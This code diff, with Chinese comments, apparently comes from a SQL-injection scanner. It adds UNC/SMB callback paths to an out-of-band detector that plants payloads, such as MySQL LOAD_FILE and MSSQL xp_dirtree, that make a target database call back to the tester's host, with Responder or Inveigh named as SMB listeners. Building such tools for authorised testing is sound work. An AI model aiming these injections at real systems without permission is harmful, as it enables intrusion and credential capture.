@@ -4,6 +4,25 @@ import { createDetectionResult } from '../models.js';
 import { OOB_PAYLOADS, DNS_OOB_PAYLOADS, SUPPORTED, fillPayload, replaceAllLiteral } from '../payloads.js';
 import { oobReceiver } from '../../core/oobReceiver.js';
 import { ErrorCode, AppError } from '../../core/errors.js';
+import { logger } from '../../core/logger.js';
+
+/**
+ * [实战分析 P1 2026-10-02] 从 callbackBase 派生 SMB/UNC 回调路径的 host\share 部分。
+ * Windows UNC 主机位不含 :port——`\\127.0.0.1:8899\x` 在真实目标上永远解析不了，
+ * 所以 UNC 类向量必须用裸主机：剥 scheme、剥路径、剥端口，token 挪进 share 名
+ * （外部 SMB 监听如 Responder 可从 share 名读出 token 完成确认）。
+ * @param {string} callbackBase 形如 'http://h:8899' / 'h:8899' / 'h' / 'h/prefix'
+ * @param {string} token nanoid token
+ * @returns {string} `<host>\oob\<token>`（不含前导 \\\\，模板层按需自带）
+ */
+export function deriveUncPath(callbackBase, token) {
+  const bareHost = String(callbackBase || '')
+    .replace(/^[a-zA-Z][a-zA-Z0-9+.-]*:\/\//, '') // 剥 scheme
+    .split('/')[0] // 剥路径
+    .replace(/:\d+$/, '') // 剥端口
+    .trim();
+  return `${bareHost}\\oob\\${token}`;
+}
 
 // OOB 带外检测器（无回显盲注兜底）
 // 策略模式与现有 Detector 子类一致：detect(ctx) 返回 DetectionResult。
@@ -41,6 +60,9 @@ export class OobDetector extends Detector {
     // 生成带外 token，并与接收端地址拼成回调 URL（目标 DBMS 被触发后回连此地址）
     const token = nanoid(16);
     const callback = `${callbackBase}/oob/${token}`;
+    // [实战分析 P1 2026-10-02] UNC/SMB 类向量（MySQL/MariaDB/TiDB LOAD_FILE、MSSQL
+    // xp_dirtree）用裸主机 + share 名形态：Windows UNC 主机位不含 :port。
+    const uncPath = deriveUncPath(callbackBase, token);
 
     // 候选 DBMS：已知 dbms 且支持 OOB → 仅打该库；否则遍历所有支持库逐一尝试
     const supportedDbs = Object.keys(SUPPORTED).filter(
@@ -49,15 +71,32 @@ export class OobDetector extends Detector {
     const candidates =
       dbms && OOB_PAYLOADS[dbms] && OOB_PAYLOADS[dbms].length ? [dbms] : supportedDbs;
 
-    // 触发目标带外请求：将 {CALLBACK} 填入各库 OOB 触发语句。
+    // 触发目标带外请求：将 {CALLBACK}/{UNC} 填入各库 OOB 触发语句。
     // 注意：OOB 注入【不做 tamper】，否则会破坏回调地址导致回连失败。
+    // [实战分析 P1 2026-10-02 通道边界显式化] UNC/SMB 向量的回连走「目标 → 本机 445」，
+    // 内置接收端只监听 HTTP+DNS 捕获不到 SMB 握手——投放 UNC 向量时打一次提示，
+    // 告知三条可行路径（外部 SMB 监听 / oob.dnsOob DNS 通道 / callbackBase 配目标可解析
+    // 的主机名）。只 log 不落 report：通道没配齐时 DNS/HTTP 轮仍可能命中，不算能力缺失。
+    let uncHintLogged = false;
     const tried = [];
     for (const cdb of candidates) {
       for (const tpl of OOB_PAYLOADS[cdb] || []) {
+        if (tpl.includes('{UNC}') && !uncHintLogged) {
+          uncHintLogged = true;
+          logger.info(
+            '[oob] 投放 UNC/SMB 类向量：token 在 share 名（' + uncPath + '）。' +
+            '内置接收端不监听 445——需外部 SMB 监听（Responder/Inveigh）读 share 名，' +
+            '或配 oob.dnsOob 走 DNS 通道；callbackBase 需为目标可解析的主机名（IP 直连 445 只有本机自身可达）。'
+          );
+        }
         const payload = replaceAllLiteral(
-          fillPayload(tpl, { orig: point.originalValue || '1' }),
-          '{CALLBACK}',
-          callback
+          replaceAllLiteral(
+            fillPayload(tpl, { orig: point.originalValue || '1' }),
+            '{CALLBACK}',
+            callback
+          ),
+          '{UNC}',
+          uncPath
         );
         tried.push(payload);
         const req = this.buildRequest(target, point, payload);
